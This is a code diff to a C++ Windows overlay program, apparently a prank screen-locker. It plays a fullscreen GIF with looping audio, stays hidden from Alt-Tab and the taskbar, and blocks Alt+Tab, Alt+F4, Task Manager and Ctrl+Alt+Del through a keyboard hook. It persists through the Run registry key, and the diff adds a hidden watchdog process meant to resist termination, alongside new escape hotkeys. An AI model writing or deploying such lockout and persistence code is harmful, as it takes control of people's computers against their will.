@@ -33,9 +33,9 @@ void AddToStartup() {
     wchar_t szPath[MAX_PATH];
     GetModuleFileNameW(NULL, szPath, MAX_PATH);
     
-    // Add startup argument
+    // Add startup argument using wsprintfW (Windows API - no include needed)
     wchar_t szStartupPath[MAX_PATH + 20];
-    swprintf(szStartupPath, MAX_PATH + 20, L"\"%s\" -startup", szPath);
+    wsprintfW(szStartupPath, L"\"%s\" -startup", szPath);
     
     LONG lnRes = RegOpenKeyExW(HKEY_CURRENT_USER,
         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -48,7 +48,39 @@ void AddToStartup() {
     }
 }
 
-// Windows key blocker
+// Function to remove program from startup
+void RemoveFromStartup() {
+    HKEY hKey;
+    const wchar_t* czStartName = L"OverlayApp";
+    
+    LONG lnRes = RegOpenKeyExW(HKEY_CURRENT_USER,
+        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_WRITE, &hKey);
+    
+    if (lnRes == ERROR_SUCCESS) {
+        RegDeleteValueW(hKey, czStartName);
+        RegCloseKey(hKey);
+    }
+}
+
+// Launch watchdog process
+void LaunchWatchdog() {
+    if (GetFileAttributesW(L"watchdog.exe") != INVALID_FILE_ATTRIBUTES) {
+        STARTUPINFOW si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        
+        if (CreateProcessW(L"watchdog.exe", NULL, NULL, NULL, FALSE, 
+                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
+}
+
+// Windows key blocker with exit keys
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
@@ -59,7 +91,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return 1; 
             }
             
-            // Block Alt+Tab, Alt+F4, Ctrl+Alt+Del, Ctrl+Shift+Esc
+            // Block Alt+Tab, Alt+F4, Ctrl+Shift+Esc
             if (pKeyboard->vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
                 return 1; // Block Alt+Tab
             }
@@ -70,7 +102,26 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 return 1; // Block Ctrl+Shift+Esc (Task Manager)
             }
             if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000) && pKeyboard->vkCode == VK_DELETE) {
-                return 1; // Try to block (not working lmao)
+                return 1; // Try to block Ctrl+Alt+Del
+            }
+            
+            // Track Alt key for exit combinations
+            if (pKeyboard->vkCode == VK_MENU) {
+                altPressed = true;
+            }
+            
+            // SAFETY EXIT: Alt+Esc to exit
+            if (pKeyboard->vkCode == VK_ESCAPE && altPressed) {
+                PostQuitMessage(0);
+                return 1;
+            }
+            
+            // UNINSTALL: Alt+Shift+U to remove from startup and exit
+            if (pKeyboard->vkCode == 'U' && altPressed && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
+                RemoveFromStartup();
+                MessageBoxW(NULL, L"Removed from startup! The spell has been broken.", L"Liberation", MB_OK | MB_ICONINFORMATION);
+                PostQuitMessage(0);
+                return 1;
             }
         }
         
@@ -84,6 +135,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
+
 // Draw current frame of the GIF
 void DrawGif(Graphics& graphics, Image* gif, UINT frameIdx, int width, int height) {
     if (!gif) return;
@@ -101,6 +153,7 @@ void DrawGif(Graphics& graphics, Image* gif, UINT frameIdx, int width, int heigh
 
     graphics.DrawImage(gif, 0, 0, width, height);
 }
+
 // Window procedure for handling messages
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
@@ -133,6 +186,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         }
         InvalidateRect(hwnd, NULL, TRUE);
         break; 
+
     // Cleanup on destroy
     case WM_DESTROY:
         // Unhook keyboard before destroying
@@ -169,6 +223,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
         
         // Add to startup on first manual run
         AddToStartup();
+        
+        // Launch watchdog process to monitor for termination
+        LaunchWatchdog();
     }
 
     // Register window class (wide version)
@@ -178,11 +235,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     wc.lpszClassName = L"OverlayWindowClass";
     RegisterClassW(&wc);
 
-    // generate fullscreen window
+    // Create fullscreen window - hidden from taskbar
     int screenW = GetSystemMetrics(SM_CXSCREEN);
     int screenH = GetSystemMetrics(SM_CYSCREEN);
     HWND hwnd = CreateWindowExW(
-        WS_EX_TOOLWINDOW,  // Prevents appearing in Alt-Tab
+        WS_EX_TOOLWINDOW,  // Prevents appearing in Alt-Tab and taskbar
         wc.lpszClassName,
         L"Overlay",
         WS_POPUP,
@@ -204,16 +261,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     if (!keyboardHook) {
         MessageBoxW(NULL, L"Failed to install keyboard hook.", L"Warning", MB_OK | MB_ICONWARNING);
     }
+
     // Load GIFs
     openingGif = Image::FromFile(L"assets\\opening.gif", FALSE);
     idleGif    = Image::FromFile(L"assets\\idle.gif", FALSE);
+
     // Check if GIFs loaded successfully
     if (!openingGif || !idleGif) {
         MessageBoxW(NULL, L"Cannot load GIF files. Ensure assets\\opening.gif and assets\\idle.gif exist.", L"Error", MB_OK | MB_ICONERROR);
+        if (keyboardHook) {
+            UnhookWindowsHookEx(keyboardHook);
+            keyboardHook = NULL;
+        }
         DestroyWindow(hwnd);
         GdiplusShutdown(gdiplusToken);
         return 1;
     }
+
     // Play background music
     PlaySoundW(L"assets\\audio.wav", NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
 
